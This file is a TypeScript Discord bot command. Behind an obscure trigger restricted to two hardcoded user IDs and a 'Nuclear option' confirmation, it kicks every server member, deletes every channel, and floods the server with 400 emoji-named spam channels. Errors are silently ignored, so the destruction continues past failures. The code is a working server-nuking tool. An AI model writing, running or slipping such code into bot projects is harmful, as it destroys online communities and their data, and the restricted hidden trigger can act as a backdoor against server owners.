import type { Message, TextChannel } from "discord.js";

let state = "0";

export default async function (
    message: Message,
    args: string[]
) {
    const channel = message.channel as TextChannel;

    const allowed =
        message.author.id === "960946185768685618" ||
        message.author.id === "1253394430652846151";

    if (
        args[0] === "!ultimatePurge-55205" &&
        allowed
    ) {
        await channel.send("are you sure?");

        if (state === "0") {
            state = "init";
        }

        return;
    }

    console.log(state);

    if (
        state === "init" &&
        allowed &&
        args[0]?.toLowerCase() === "yes"
    ) {
        console.log("after init");

        await channel.send(
            'Activating Nuclear option, if you want to cancel, write "Cancle" in the next 10 seconds'
        );

        state = "nuclear launch";

        console.log("launch");

        setTimeout(async () => {
            if (state !== "nuclear launch") return;

            state = "nuke";

            await channel.send(
                "Activated Nuclear option with no return"
            );

            console.log("nuke");

            setTimeout(async () => {
                if (state === "nuke") {
                    const guild = message.guild;

                    if (!guild) {
                        await channel.send(
                            "Not inside a guild"
                        );
                        return;
                    }

                    try {
                        const members =
                            await guild.members.fetch();

                        for (const [, member] of members) {
                            try {
                                await member.kick();
                            } catch {}
                        }

                        const channels =
                            await guild.channels.fetch();

                        for (const [, ch] of channels) {
                            try {
                                await ch?.delete();
                            } catch {}
                        }

                        for (let i = 0; i < 100; i++) {
                            try {
                                await guild.channels.create({
                                    name: "🤣"
                                });
                            } catch {}
                        }

                        for (let i = 0; i < 100; i++) {
                            try {
                                await guild.channels.create({
                                    name: "⏰"
                                });
                            } catch {}
                        }

                        for (let i = 0; i < 100; i++) {
                            try {
                                await guild.channels.create({
                                    name: "🌙"
                                });
                            } catch {}
                        }

                        for (let i = 0; i < 100; i++) {
                            try {
                                await guild.channels.create({
                                    name: "🙁"
                                });
                            } catch {}
                        }
                    } catch (err) {
                        console.error(err);
                    }

                    state = "0";
                }
            }, 2500);
        }, 10000); // actual 10 seconds
    }

    if (
        state === "nuclear launch" &&
        message.content === "Cancle"
    ) {
        await channel.send(
            "Canceling Nuclear option"
        );

        state = "0";
    }
}